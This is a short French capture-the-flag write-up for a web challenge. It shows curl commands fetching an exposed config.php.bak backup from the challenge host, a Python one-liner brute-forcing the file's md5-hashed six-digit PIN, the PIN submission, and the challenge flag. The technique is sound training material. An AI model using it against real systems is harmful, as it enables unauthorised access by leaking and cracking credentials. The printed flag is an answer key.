# Comparaison Hâtive

Web · 200 points · Créé par [@PercevalFox](https://github.com/PercevalFox)

La page de l'intranet demande un code PIN de 6 chiffres. En regardant le code source de la page, on voit un commentaire de
Didier qui dit qu'il doit supprimer la sauvegarde `config.php.bak` avant la mise en production. Il l'a oubliée. Le fichier
`config.php` lui-même est exécuté par le serveur et ne montre rien, mais la sauvegarde, elle, est servie en clair et contient
le hash md5 du PIN.

Un PIN de 6 chiffres, ce sont un million de possibilités : on les essaie toutes.

```bash
curl -s https://comparaison-hative.cyberzerk.fr/config.php.bak
python3 -c "import hashlib; h='1a31076f2aeb1e7d69120c9f85c3a8da'; print(next('%06d'%i for i in range(10**6) if hashlib.md5(('%06d'%i).encode()).hexdigest()==h))"
curl -s "https://comparaison-hative.cyberzerk.fr/?pin=496135"
```

La comparaison est stricte, il n'y a donc qu'un seul PIN valide.

**Flag :** `CyberZerk{un3_sauv3g4rd3_.bak_tr4h1t_l3_pin}`
